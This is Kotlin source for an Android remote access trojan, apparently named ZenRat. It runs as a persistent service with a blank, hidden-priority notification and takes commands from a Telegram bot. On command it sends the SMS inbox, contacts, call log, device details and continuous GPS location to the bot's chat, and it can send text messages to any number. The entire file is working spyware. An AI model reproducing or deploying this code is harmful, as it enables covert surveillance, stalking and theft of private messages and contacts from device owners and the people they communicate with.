package com.zenrat.client.core

import android.app.Service
import android.content.Intent
import android.annotation.SuppressLint
import android.net.Uri
import android.os.IBinder
import android.provider.Settings
import android.Manifest
import android.content.pm.PackageManager
import android.provider.ContactsContract
import android.location.Location
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource
import io.ktor.client.*
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await
import io.ktor.client.call.*
import io.ktor.client.engine.cio.*
import io.ktor.client.plugins.contentnegotiation.*
import io.ktor.client.request.*
import io.ktor.serialization.kotlinx.json.*
import kotlinx.coroutines.*
import kotlinx.serialization.json.Json

class ZenRatService : Service() {

    private val job = Job()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    private var locationUpdateJob: Job? = null

    private val client by lazy {
        HttpClient(CIO) {
            install(ContentNegotiation) {
                json(Json {
                    ignoreUnknownKeys = true
                    isLenient = true
                })
            }
        }
    }

    private var lastUpdateId = 0L

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service is starting...")

        startForeground(NOTIFICATION_ID, createNotification())

        scope.launch {
            pollTelegramUpdates()
        }
        return START_STICKY
    }

    private fun createNotification(): android.app.Notification {
        val channelId = "ZenRatServiceChannel"
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val channel = android.app.NotificationChannel(
                channelId,
                "ZenRat Service",
                android.app.NotificationManager.IMPORTANCE_MIN
            )
            val manager = getSystemService(android.content.Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            manager.createNotificationChannel(channel)
        }

        return androidx.core.app.NotificationCompat.Builder(this, channelId)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_upload) // A generic system icon
            .build()
    }

    private suspend fun pollTelegramUpdates() {
        while (isActive) {
            try {
                val response: ApiResponse<List<Update>> = client.get("$TELEGRAM_API_URL$BOT_TOKEN_PLACEHOLDER/getUpdates") {
                    parameter("offset", lastUpdateId + 1)
                    parameter("timeout", 30) // Long polling timeout
                }.body()

                if (response.ok && response.result.isNotEmpty()) {
                    response.result.forEach { update ->
                        lastUpdateId = update.updateId
                        update.message?.let { message ->
                            Log.d(TAG, "Received message: ${message.text} from chat ${message.chat.id}")
                            handleCommand(message)
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error polling updates", e)
                // Wait before retrying to avoid spamming in case of network errors
                delay(5000)
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Service is being destroyed.")
        job.cancel()
    }

    private suspend fun handleCommand(message: Message) {
        when (message.text) {
            "/start" -> {
                sendMessage(message.chat.id, "Device is online.")
            }
            "/deviceinfo" -> {
                val deviceInfo = getDeviceInfo()
                sendMessage(message.chat.id, deviceInfo)
            }
            "/permissions" -> {
                openAppSettings()
                sendMessage(message.chat.id, "Opening app settings to grant permissions.")
            }
            "/getsms" -> {
                val smsList = getSmsMessages()
                sendMessage(message.chat.id, smsList)
            }
            message.text.startsWith("/sendsms") -> {
                val parts = message.text.split(" ", limit = 3)
                if (parts.size == 3) {
                    val phoneNumber = parts[1]
                    val smsText = parts[2]
                    val result = sendSms(phoneNumber, smsText)
                    sendMessage(message.chat.id, result)
                } else {
                    sendMessage(message.chat.id, "Invalid format. Use: /sendsms <phoneNumber> <message>")
                }
            }
            "/getlocation" -> {
                val location = getCurrentLocation()
                if (location != null) {
                    val mapsLink = "https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude}"
                    sendMessage(message.chat.id, "Last known location: $mapsLink")
                } else {
                    sendMessage(message.chat.id, "Could not retrieve location. Have you granted location permissions?")
                }
            }
            "/startlocationupdates" -> {
                startLocationUpdates(message.chat.id)
            }
            "/stoplocationupdates" -> {
                stopLocationUpdates()
                sendMessage(message.chat.id, "Location updates stopped.")
            }
            "/getcontacts" -> {
                val contacts = getContacts()
                sendMessage(message.chat.id, contacts)
            }
            "/getcalllog" -> {
                val callLog = getCallLog()
                sendMessage(message.chat.id, callLog)
            }
        }
    }

    @SuppressLint("Recycle")
    private fun getCallLog(): String {
        val callLogList = StringBuilder("--- Call Log (Last 10) ---\n\n")
        try {
            val cursor = contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                "${android.provider.CallLog.Calls.DATE} DESC LIMIT 10"
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    do {
                        val number = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER))
                        val type = it.getInt(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE))
                        val date = it.getLong(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE))
                        val duration = it.getLong(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION))

                        val callType = when (type) {
                            android.provider.CallLog.Calls.INCOMING_TYPE -> "Incoming"
                            android.provider.CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                            android.provider.CallLog.Calls.MISSED_TYPE -> "Missed"
                            else -> "Unknown"
                        }

                        callLogList.append("Number: $number\n")
                        callLogList.append("Type: $callType\n")
                        callLogList.append("Date: ${java.util.Date(date)}\n")
                        callLogList.append("Duration: $duration seconds\n---\n")

                    } while (it.moveToNext())
                } else {
                    callLogList.append("No call logs found.")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading call log", e)
            return "Error reading call log. Have you granted READ_CALL_LOG permission?"
        }
        return callLogList.toString()
    }

    @SuppressLint("Recycle")
    private fun getContacts(): String {
        val contactsList = StringBuilder("--- Contacts ---\n\n")
        try {
            val cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null,
                null,
                null,
                "${ContactsContract.Contacts.DISPLAY_NAME} ASC LIMIT 20"
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    do {
                        val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                        val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
                        contactsList.append("Name: $name\n")

                        val phoneCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                            arrayOf(id),
                            null
                        )
                        phoneCursor?.use { pCursor ->
                            if (pCursor.moveToFirst()) {
                                do {
                                    val phoneNumber = pCursor.getString(pCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                    contactsList.append("  Phone: $phoneNumber\n")
                                } while (pCursor.moveToNext())
                            }
                        }
                        contactsList.append("---\n")
                    } while (it.moveToNext())
                } else {
                    contactsList.append("No contacts found.")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading contacts", e)
            return "Error reading contacts. Have you granted READ_CONTACTS permission?"
        }
        return contactsList.toString()
    }

    private fun startLocationUpdates(chatId: Long) {
        locationUpdateJob?.cancel() // Cancel any existing job
        locationUpdateJob = scope.launch {
            sendMessage(chatId, "Starting location updates every 60 seconds...")
            while (isActive) {
                val location = getCurrentLocation()
                if (location != null) {
                    val mapsLink = "https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude}"
                    sendMessage(chatId, "Live Location: $mapsLink")
                }
                delay(60000) // 60 seconds
            }
        }
    }

    private fun stopLocationUpdates() {
        locationUpdateJob?.cancel()
    }

    private suspend fun getCurrentLocation(): Location? {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return null
        }
        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        return try {
            fusedLocationClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, CancellationTokenSource().token).await()
        } catch (e: Exception) {
            Log.e(TAG, "Error getting location", e)
            null
        }
    }

    private fun sendSms(phoneNumber: String, message: String): String {
        return try {
            val smsManager = this.getSystemService(SmsManager::class.java)
            smsManager.sendTextMessage(phoneNumber, null, message, null, null)
            "SMS sent to $phoneNumber."
        } catch (e: Exception) {
            Log.e(TAG, "Error sending SMS", e)
            "Error sending SMS. Have you granted SEND_SMS permission?"
        }
    }

    @SuppressLint("Recycle") // The cursor is closed by the `use` block.
    private fun getSmsMessages(): String {
        val smsList = StringBuilder("--- INBOX (Last 10) ---\n\n")
        try {
            val cursor = contentResolver.query(
                Telephony.Sms.Inbox.CONTENT_URI,
                arrayOf(Telephony.Sms.Inbox.ADDRESS, Telephony.Sms.Inbox.BODY, Telephony.Sms.Inbox.DATE),
                null,
                null,
                "${Telephony.Sms.Inbox.DATE} DESC LIMIT 10"
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    do {
                        val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.Inbox.ADDRESS))
                        val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.Inbox.BODY))
                        smsList.append("From: $address\nMessage: $body\n---\n")
                    } while (it.moveToNext())
                } else {
                    smsList.append("No SMS found in inbox.")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading SMS", e)
            return "Error reading SMS. Have you granted READ_SMS permission?"
        }
        return smsList.toString()
    }

    private fun openAppSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
        intent.data = Uri.fromParts("package", packageName, null)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    }

    private fun getDeviceInfo(): String {
        val batteryManager = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        val batteryLevel = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)

        return """
            Device Information:
            Model: ${android.os.Build.MODEL}
            Manufacturer: ${android.os.Build.MANUFACTURER}
            Android Version: ${android.os.Build.VERSION.RELEASE} (API ${android.os.Build.VERSION.SDK_INT})
            Battery: $batteryLevel%
        """.trimIndent()
    }

    private suspend fun sendMessage(chatId: Long, text: String) {
        try {
            client.post("$TELEGRAM_API_URL$BOT_TOKEN_PLACEHOLDER/sendMessage") {
                parameter("chat_id", chatId)
                parameter("text", text)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error sending message", e)
        }
    }

    companion object {
        private const val TAG = "ZenRatService"
        private const val NOTIFICATION_ID = 1337
    }
}
